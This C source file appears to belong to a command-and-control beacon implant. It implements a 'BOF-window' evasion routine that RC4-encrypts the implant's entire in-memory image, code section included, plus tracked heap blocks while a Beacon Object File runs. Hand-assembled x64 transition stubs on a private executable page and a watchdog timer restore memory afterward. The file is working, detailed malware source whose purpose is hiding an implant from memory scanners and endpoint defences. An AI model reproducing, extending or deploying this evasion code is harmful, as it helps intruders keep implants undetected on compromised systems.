/* Phase 3 BOF-window masking (see docs/EVASION-ROADMAP.md section 13.11).
 *
 * Masks the FULL beacon image - .text included - plus every tracked heap
 * block for the duration of a BOF that imports NO beacon APIs (boff.cpp
 * gates on the import analysis). The admission rule is what makes .text
 * maskable at all: with zero ftable relocations the BOF can never execute
 * beacon code during its run, so nothing needs the image in plaintext -
 * the same class of guarantee the gen3 sleep window has, applied to an
 * arbitrary Win32-only workload.
 *
 * The transitions are the hard part (an in-place RC4 of .text destroys the
 * running engine - the round-14 lesson that keeps .text out of the gen3
 * sleep mask). Solution: three hand-assembled stubs on a private RX page
 * (gate-stub technique) bracket the window:
 *
 *   C: mask every non-.text block (plain RC4 loops, still in .text)
 *   call enter_stub:                       [entered rsp%16==8]
 *       sub rsp,8 / push exit_stub / sub rsp,0x28   -> BOF ret lands on
 *                                                      exit_stub, rsp%16==8
 *       sf032(u_text, u_key)               <- masks .text (the LAST block)
 *                                              while executing the page
 *       rcx=args, rdx=alen, jmp entry
 *   [BOF runs: whole image + tracked heap ciphertext, Win32 calls only]
 *   BOF ret -> exit_stub:                  [entered rsp%16==0]
 *       xchg state 1->2 (watchdog race guard); winner: sf032(.text) back
 *       ret                                <- pops the C caller's return
 *   C: unmask the remaining blocks, kill the watchdog, wipe the ctx
 *
 * The pushed exit_stub makes the stack self-consistent - no frame surgery:
 * the C caller resumes exactly as if enter_stub had returned normally.
 *
 * Watchdog: if the BOF never returns, a one-shot timer fires watchdog_stub
 * (page code): xchg-winner restores .text, tail-jumps bw_watchdog_rest
 * (plain C, .text plaintext again) which restores the rest. The beacon
 * degrades to unmasked with the BOF still running - never stuck masked.
 *
 * Alignment cheatsheet (why the paddings differ): enter/exit/watchdog are
 * entered with rsp%16 of 8 / 0 / 8 respectively; each sf032 call site pads
 * to rsp%16==0 right before its call. Verified by capstone disassembly of
 * the built page (evasion-lab/verify_bofwin_stub.py).
 *
 * x64 only. x86 compiles to permanent FALSE (caller runs the BOF unmasked). */
#include <windows.h>
#include <string.h>
#include "sleepmask_bofwin.h"
#include "gargleint.h"
#include "track_memory.h"
#include "crypto.h"

#if defined(_M_X64)

typedef struct {
	unsigned char * ptr;
	unsigned long   len;
	DWORD           orig_prot; /* restored after the unmask - .text is RX in
	                            * the injected image and RC4 needs RW */
} BW_BLOCK;

#define BW_MAX_BLOCKS 128

typedef struct {
	unsigned char * Buffer;
	unsigned long   Length;
	unsigned long   MaximumLength;
} BW_USTRING;

typedef NTSTATUS(NTAPI *BW_SF032)(BW_USTRING * data, BW_USTRING * key);

/* ctx page - FIXED OFFSETS addressed by the hand-asm stubs. Any field move
 * must update the stub builders below. */
typedef struct {
	volatile LONG   state;                /* +0x00: 0 idle / 1 open / 2 closed */
	volatile LONG   rest_done;            /* +0x04: rest-unmask claim flag    */
	unsigned char   key[16];              /* +0x08                            */
	BW_SF032        sf032;                /* +0x18 SystemFunction032          */
	void          (*entry)(void *, int);  /* +0x20 BOF entry                  */
	void          * args;                 /* +0x28                            */
	int             alen;                 /* +0x30                            */
	BW_BLOCK      * blocks;               /* +0x38 -> ctx->storage            */
	int             nblocks;              /* +0x40                            */
	int             text_idx;             /* +0x48 .text block index          */
	BW_USTRING      u_text;               /* +0x50                            */
	BW_USTRING      u_key;                /* +0x60  (Buffer -> ctx->key)      */
	unsigned char   storage[BW_MAX_BLOCKS * sizeof(BW_BLOCK)];
} BW_CTX;

volatile long g_bw_watchdog_fires;  /* test hook: watchdog rest-path count */

static unsigned char * g_bw_stubs;   /* private RX page: enter/exit/watchdog */
static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */

#define BW_STATE_IDLE   0
#define BW_STATE_OPEN   1
#define BW_STATE_CLOSED 2

#define BW_ENTER_OFF 0x000
#define BW_EXIT_OFF  0x040
#define BW_WATCH_OFF 0x080

/* RC4-with-counter, byte-for-byte the gen3 scheme (sleepmask_gen3.cpp):
 * round-tripping a block under a DIFFERENT counter would corrupt it. */
static void bw_rc4(BW_SF032 fn, unsigned char * buf, unsigned long len,
                   const unsigned char * key, unsigned int ctr)
{
	unsigned char k[16];
	BW_USTRING d, kk;
	int j;

	for (j = 0; j < 16; j++)
		k[j] = key[j];
	k[0] ^= (unsigned char)ctr;
	k[1] ^= (unsigned char)(ctr >> 8);
	kk.Buffer = k;
	kk.Length = kk.MaximumLength = 16;
	d.Buffer = buf;
	d.Length = d.MaximumLength = len;
	fn(&d, &kk);
	for (j = 0; j < 16; j++)
		k[j] = 0;
}

/* section protection with guard/noaccess rejection. The original
 * protection is returned through *prot for the post-unmask restore: .text
 * is RX in the injected image and the RC4 pass needs RW, so the window
 * flips pages and puts them back (the arsenal-kit sleepmasks do the same
 * around their encryption). */
static BOOL bw_page_usable(void * p, DWORD * prot)
{
	MEMORY_BASIC_INFORMATION mbi;

	if (p == NULL || prot == NULL)
		return FALSE;
	if (!VirtualQuery(p, &mbi, sizeof(mbi)))
		return FALSE;
	if (mbi.State != MEM_COMMIT)
		return FALSE;
	if (mbi.Protect & PAGE_GUARD)
		return FALSE;
	if (mbi.Protect == PAGE_NOACCESS)
		return FALSE;
	*prot = mbi.Protect;
	return TRUE;
}

/* flip every block to RW (returns FALSE on failure - caller must undo) */
static BOOL bw_blocks_to_rw(BW_BLOCK * blocks, int n)
{
	int i;
	DWORD old = 0;

	for (i = 0; i < n; i++) {
		if (!VirtualProtect(blocks[i].ptr, blocks[i].len, PAGE_READWRITE, &old))
			return FALSE;
	}
	return TRUE;
}

/* restore the recorded protections; safe from any thread post-unmask */
static void bw_blocks_restore(BW_BLOCK * blocks, int n)
{
	int i;
	DWORD old = 0;

	for (i = 0; i < n; i++)
		VirtualProtect(blocks[i].ptr, blocks[i].len, blocks[i].orig_prot, &old);
	FlushInstructionCache(GetCurrentProcess(), blocks[0].ptr, 0);
}

/* Snapshot the whole image (header page + every section except the
 * unwind/reloc tables) plus tracked heap records outside the image. The
 * .text block is appended LAST and reported via *text_idx - the enter stub
 * masks it separately and the exit stub restores it first. */
static int bw_snapshot(BW_BLOCK * out, int max, void * image, int * text_idx)
{
	unsigned char * pe = (unsigned char *)image;
	unsigned char * img_hi;
	DWORD lfanew, secoff, sizeimg, text_va = 0, text_end = 0;
	WORD nsec, optsz, i;
	int n = 0;
	HEAP_RECORD * hr;

	*text_idx = -1;
	if (pe == NULL || pe[0] != 'M' || pe[1] != 'Z')
		return 0;
	lfanew = *(DWORD *)(pe + 0x3C);
	if (*(DWORD *)(pe + lfanew) != 0x00004550)
		return 0;
	nsec    = *(WORD *)(pe + lfanew + 6);
	optsz   = *(WORD *)(pe + lfanew + 20);
	secoff  = lfanew + 24 + optsz;
	sizeimg = *(DWORD *)(pe + lfanew + 24 + 0x38);
	img_hi  = pe + sizeimg;

	for (i = 0; i < nsec && n + 3 < max; i++) {
		unsigned char * so = pe + secoff + (DWORD)i * 40;
		DWORD vsz  = *(DWORD *)(so + 8);
		DWORD raw  = *(DWORD *)(so + 16);
		DWORD va   = *(DWORD *)(so + 12);
		DWORD span = vsz > raw ? vsz : raw;
		BOOL  is_text   = (memcmp(so, ".text", 5) == 0);
		BOOL  is_unwind = (memcmp(so, ".pdata", 6) == 0) ||
		                  (memcmp(so, ".xdata", 6) == 0) ||
		                  (memcmp(so, ".reloc", 6) == 0);

		if (span == 0 || is_unwind)
			continue; /* exception dispatch + loader tables stay plaintext */
		if (is_text) {
			if (text_va != 0)
				continue; /* first .text wins */
			text_va = va;
			text_end = va + span;
			continue; /* appended after the loop */
		}
		if (bw_page_usable(pe + va, &out[n].orig_prot)) {
			out[n].ptr = pe + va;
			out[n].len = span;
			n++;
		}
	}

	/* the header page (everything below the first section) is data - mask
	 * it too; prepend without disturbing the section order */
	{
		DWORD first = text_va ? text_va : 0x1000;

		DWORD hprot = 0;

		if (first > 0 && bw_page_usable(pe, &hprot)) {
			memmove(&out[1], &out[0], (size_t)n * sizeof(BW_BLOCK));
			out[0].ptr = pe;
			out[0].len = first;
			out[0].orig_prot = hprot;
			n++;
		}
	}

	if (text_va != 0 && bw_page_usable(pe + text_va, &out[n].orig_prot)) {
		out[n].ptr = pe + text_va;
		out[n].len = text_end - text_va;
		*text_idx = n;
		n++;
	}
	else {
		return 0; /* no .text to protect -> no meaningful window */
	}

	/* tracked heap: the g3 dedup rules - a record fully inside the image is
	 * redundant (its section block covers it) and double-encrypting an
	 * overlap corrupts it (per-block RC4 keys are not order-independent -
	 * the round-12 lesson) */
	hr = track_memory_get_heap_records_to_mask();
	while (n < max && hr != NULL && hr->ptr != NULL) {
		unsigned char * hp = (unsigned char *)hr->ptr;
		unsigned char * he = hp + hr->size;

		if (hr->size > 0 && hr->size < 0x40000000) {
			if (!(hp >= pe && he <= img_hi)) {
				if (hp < pe && he > pe)
					he = pe;
				if (hp < img_hi && he > img_hi)
					hp = img_hi;
				if (hp < he && bw_page_usable(hp, &out[n].orig_prot)) {
					out[n].ptr = hp;
					out[n].len = (unsigned long)(he - hp);
					n++;
				}
			}
		}
		hr++;
	}
	return n;
}

/* ---- hand-assembled transition stubs (gate-stub technique) ----
 *
 * Page layout (byte offsets; the ctx qword and the watchdog tail-jump
 * target are patched at build time):
 *   0x000 enter_stub
 *   0x040 exit_stub
 *   0x080 watchdog_stub
 *   0x0C0 qword: ctx page address (rip-relative source for all three)
 *
 * enter (called from C, rsp%16==8, [rsp]=ret_to_C):
 *   sub rsp,8              48 83 EC 08         -> 0
 *   mov r11,exit_imm64     49 BB ..            (page+0x040)
 *   push r11               41 53               -> 8, [rsp]=exit
 *   sub rsp,0x28           48 83 EC 28         -> 0 (32B shadow + 8 align)
 *   mov rax,[rip+ctx]      48 8B 05 d32
 *   lea rcx,[rax+0x50]     48 8D 48 50         u_text
 *   lea rdx,[rax+0x60]     48 8D 50 60         u_key
 *   call [rax+0x18]        FF 50 18            sf032: .text masked (last)
 *   add rsp,0x28           48 83 C4 28         -> 8
 *   mov rcx,[rax+0x28]     48 8B 48 28         args
 *   mov edx,[rax+0x30]     8B 50 30            alen
 *   jmp [rax+0x20]         FF 60 20            BOF entry (as-if-called)
 *
 * exit (BOF's ret lands here, rsp%16==0, [rsp]=ret_to_C):
 *   mov rax,[rip+ctx]      48 8B 05 d32
 *   mov ecx,2              B9 02 00 00 00
 *   xchg ecx,[rax]         87 08               claim the close atomically
 *   cmp ecx,1              83 F9 01
 *   jne skip               75 13               (19 bytes to skip)
 *   sub rsp,0x30           48 83 EC 30         -> 0 (entered at 0!)
 *   lea rcx,[rax+0x50]     48 8D 48 50
 *   lea rdx,[rax+0x60]     48 8D 50 60
 *   call [rax+0x18]        FF 50 18            .text restored
 *   add rsp,0x30           48 83 C4 30
 * skip:
 *   ret                    C3                  -> back into plaintext C
 *
 * watchdog (timer callback, rsp%16==8, [rsp]=ret_dispatcher):
 *   mov rax,[rip+ctx]      48 8B 05 d32
 *   mov ecx,2              B9 02 00 00 00
 *   xchg ecx,[rax]         87 08
 *   cmp ecx,1              83 F9 01
 *   jne wd_ret             75 24               (36 bytes to the ret)
 *   sub rsp,0x28           48 83 EC 28         -> 0 (entered at 8)
 *   lea rcx,[rax+0x50]     48 8D 48 50
 *   lea rdx,[rax+0x60]     48 8D 50 60
 *   call [rax+0x18]        FF 50 18            .text restored mid-BOF
 *   add rsp,0x28           48 83 C4 28         -> 8
 *   mov rcx,rax            48 89 C1            ctx as first arg
 *   jmp [rip+0]            FF 25 00 00 00 00   tail-jump bw_watchdog_rest
 *   <qword &bw_watchdog_rest>                    (returns to dispatcher)
 * wd_ret:
 *   ret                    C3
 */
static unsigned char * bw_put32(unsigned char * p, long v)
{
	memcpy(p, &v, 4);
	return p + 4;
}

static unsigned char * bw_put64(unsigned char * p, unsigned long long v)
{
	memcpy(p, &v, 8);
	return p + 8;
}

/* disp32 so a rip-relative instruction ending at page offset next targets
 * the qword at page offset target */
static long bw_disp(int next, int target)
{
	return (long)target - (long)next;
}

static BW_SF032 bw_sf032_resolve(void)
{
	HMODULE adv = GetModuleHandleA("advapi32.dll");

	if (adv == NULL)
		adv = LoadLibraryA("advapi32.dll");
	if (adv == NULL)
		return NULL;
	return (BW_SF032)GetProcAddress(adv, "SystemFunction032");
}

/* the watchdog tail-jump target: restores the non-.text blocks from plain
 * C. Reached only after the winning xchg already restored .text, so this
 * runs with .text plaintext even while the BOF is still going. Returns to
 * the timer dispatcher (the stub tail-jumped with its return address). */
static void __stdcall bw_watchdog_rest(BW_CTX * ctx)
{
	int i;

	if (ctx == NULL || InterlockedExchange(&ctx->rest_done, 1) != 0)
		return; /* the post-exit C path (or a prior watchdog) did it */
	InterlockedIncrement(&g_bw_watchdog_fires);
	for (i = 0; i < ctx->nblocks; i++) {
		if (i == ctx->text_idx)
			continue;
		bw_rc4(ctx->sf032, ctx->blocks[i].ptr, ctx->blocks[i].len,
		       ctx->key, (unsigned int)i);
	}
	bw_blocks_restore(ctx->blocks, ctx->nblocks);
	/* the BOF thread's exit_stub will see state==CLOSED and just ret */
}

static BOOL bw_build_pages(void)
{
	DWORD old = 0;
	unsigned char * p;
	unsigned char * e;

	if (g_bw_stubs != NULL && g_bw_ctx != NULL)
		return TRUE;

	g_bw_ctx = (BW_CTX *)VirtualAlloc(NULL, sizeof(BW_CTX), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	g_bw_stubs = (unsigned char *)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (g_bw_ctx == NULL || g_bw_stubs == NULL)
		return FALSE;
	memset(g_bw_ctx, 0, sizeof(BW_CTX));
	memset(g_bw_stubs, 0, 0x1000);
	p = g_bw_stubs;

	/* ---- enter_stub ---- */
	e = p + BW_ENTER_OFF;
	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x08;            /* sub rsp,8 */
	e += 4;
	e[0] = 0x49; e[1] = 0xBB;                                        /* mov r11, imm64 */
	e = bw_put64(e + 2, (unsigned long long)(p + BW_EXIT_OFF));
	e[0] = 0x41; e[1] = 0x53;                                        /* push r11 */
	e += 2;
	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
	e += 4;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, 0x0C0));
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
	e += 4;
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
	e += 4;
	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call [rax+0x18] */
	e += 3;
	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* add rsp,0x28 */
	e += 4;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x28;            /* mov rcx,[rax+0x28] */
	e += 4;
	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x30;                          /* mov edx,[rax+0x30] */
	e += 3;
	e[0] = 0xFF; e[1] = 0x60; e[2] = 0x20;                          /* jmp [rax+0x20] */
	e += 3;
	if ((int)(e - (p + BW_ENTER_OFF)) > 0x40)
		return FALSE;

	/* ---- exit_stub ---- */
	e = p + BW_EXIT_OFF;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, 0x0C0));
	e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
	e += 5;
	e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
	e += 2;
	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
	e += 3;
	e[0] = 0x75; e[1] = 0x13;                                        /* jne skip (+19) */
	e += 2;
	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x30;            /* sub rsp,0x30 */
	e += 4;
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
	e += 4;
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
	e += 4;
	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call [rax+0x18] */
	e += 3;
	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x30;            /* add rsp,0x30 */
	e += 4;
	/* skip: */
	e[0] = 0xC3;                                                     /* ret */
	e += 1;
	if ((int)(e - (p + BW_EXIT_OFF)) > 0x40)
		return FALSE;

	/* ---- watchdog_stub ---- */
	e = p + BW_WATCH_OFF;
	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, 0x0C0));
	e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
	e += 5;
	e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
	e += 2;
	e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
	e += 3;
	e[0] = 0x75; e[1] = 0x24;                                        /* jne wd_ret (+36) */
	e += 2;
	e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
	e += 4;
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
	e += 4;
	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
	e += 4;
	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call [rax+0x18] */
	e += 3;
	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* add rsp,0x28 */
	e += 4;
	e[0] = 0x48; e[1] = 0x89; e[2] = 0xC1;                          /* mov rcx,rax */
	e += 3;
	e[0] = 0xFF; e[1] = 0x25;                                        /* jmp qword [rip+0] */
	{
		unsigned long long rest = (unsigned long long)(size_t)bw_watchdog_rest;
		memcpy(e + 6, &rest, 8); /* the qword the jmp dereferences sits at rip == insn end */
	}
	e += 14;
	e[0] = 0xC3;                                                     /* wd_ret: ret */
	e += 1;
	if ((int)(e - (p + BW_WATCH_OFF)) > 0x3F)
		return FALSE;

	/* the ctx qword both stubs load rip-relatively */
	bw_put64(p + 0x0C0, (unsigned long long)(size_t)g_bw_ctx);

	if (!VirtualProtect(p, 0x1000, PAGE_EXECUTE_READ, &old))
		return FALSE;
	FlushInstructionCache(GetCurrentProcess(), p, 0x1000);
	return TRUE;
}

BOOL bofwin_supported(void)
{
	return bw_build_pages();
}

void * bofwin_test_stub_page(void);
void * bofwin_test_stub_page(void)
{
	return g_bw_stubs; /* CI diagnostics: dump the built page, verify the
	                    * bytes match the capstone mirror offline */
}

BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
{
	BW_SF032 fn;
	BW_BLOCK * blocks;
	int nblocks, text_idx, i;
	unsigned char key[16];
	HANDLE timer = NULL;
	void (*enter)(void);

	/* a background job thread could execute beacon code while the image is
	 * ciphertext - the window is single-threaded only (same guard as the
	 * gen3 sleep path). gparms must already be initialized by the caller
	 * (boff.cpp mirrors gen3_sleep's lazy gargle_setup_parms). */
	if (entry == NULL || threadcount > 0 || gparms == NULL || gparms->beacon_ptr == NULL)
		return FALSE;
	if (!bw_build_pages())
		return FALSE;
	fn = bw_sf032_resolve();
	if (fn == NULL)
		return FALSE;

	blocks = (BW_BLOCK *)g_bw_ctx->storage;
	nblocks = bw_snapshot(blocks, BW_MAX_BLOCKS, gparms->beacon_ptr, &text_idx);
	if (nblocks < 2 || text_idx < 0)
		return FALSE;

	if (crypto_rng_get_bytes(key, (unsigned long)sizeof(key)) == 0)
		return FALSE;

	g_bw_ctx->state = BW_STATE_OPEN;
	g_bw_ctx->rest_done = 0;
	memcpy(g_bw_ctx->key, key, 16);
	g_bw_ctx->sf032 = fn;
	g_bw_ctx->entry = entry;
	g_bw_ctx->args = args;
	g_bw_ctx->alen = alen;
	g_bw_ctx->blocks = blocks;
	g_bw_ctx->nblocks = nblocks;
	g_bw_ctx->text_idx = text_idx;
	g_bw_ctx->u_text.Buffer = blocks[text_idx].ptr;
	g_bw_ctx->u_text.Length = g_bw_ctx->u_text.MaximumLength = blocks[text_idx].len;
	g_bw_ctx->u_key.Buffer = g_bw_ctx->key;
	g_bw_ctx->u_key.Length = g_bw_ctx->u_key.MaximumLength = 16;

	/* every block needs RW for the in-place RC4 (.text is RX in the
	 * injected image); restored by the winner of each unmask path. Any
	 * failure after this point MUST run the full unmask - the mask loop
	 * below already scrambles memory. */
	if (!bw_blocks_to_rw(blocks, nblocks))
		return FALSE;

	/* mask everything except .text - plain RC4 loops are fine here, we are
	 * still executing .text and it must stay plaintext until enter_stub */
	for (i = 0; i < nblocks; i++) {
		if (i != text_idx)
			bw_rc4(fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
	}

	/* one-shot watchdog BEFORE entering: a BOF that never returns must not
	 * leave the process masked forever */
	if (watchdog_ms == 0)
		watchdog_ms = BW_DEFAULT_WATCHDOG_MS;
	if (!CreateTimerQueueTimer(&timer, NULL,
	                           (WAIT_OR_TIMER_CALLBACK)(void *)(g_bw_stubs + BW_WATCH_OFF),
	                           NULL, watchdog_ms, 0,
	                           WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION)) {
		/* no watchdog -> no window: undo the mask and run the BOF plainly */
		for (i = 0; i < nblocks; i++) {
			if (i != text_idx)
				bw_rc4(fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
		}
		bw_blocks_restore(blocks, nblocks);
		g_bw_ctx->state = BW_STATE_IDLE;
		return FALSE;
	}

	enter = (void (*)(void))(g_bw_stubs + BW_ENTER_OFF);
	enter(); /* the BOF's ret -> exit_stub -> ret lands right here */

	/* .text is plaintext again (exit_stub restored it, or the watchdog did
	 * and exit_stub saw state==CLOSED) */
	if (InterlockedExchange(&g_bw_ctx->rest_done, 1) == 0) {
		for (i = 0; i < nblocks; i++) {
			if (i != text_idx)
				bw_rc4(fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
		}
		bw_blocks_restore(blocks, nblocks);
	}
	DeleteTimerQueueTimer(NULL, timer, NULL);

	memset(key, 0, sizeof(key));
	memset(g_bw_ctx->key, 0, 16);
	memset(g_bw_ctx->storage, 0, sizeof(g_bw_ctx->storage));
	g_bw_ctx->state = BW_STATE_IDLE;
	return TRUE;
}

#else /* !_M_X64: x86 keeps the sleeve small - no window, plain BOF */

BOOL bofwin_supported(void)
{
	return FALSE;
}

BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watchdog_ms)
{
	(void)entry; (void)args; (void)alen; (void)watchdog_ms;
	return FALSE;
}

#endif
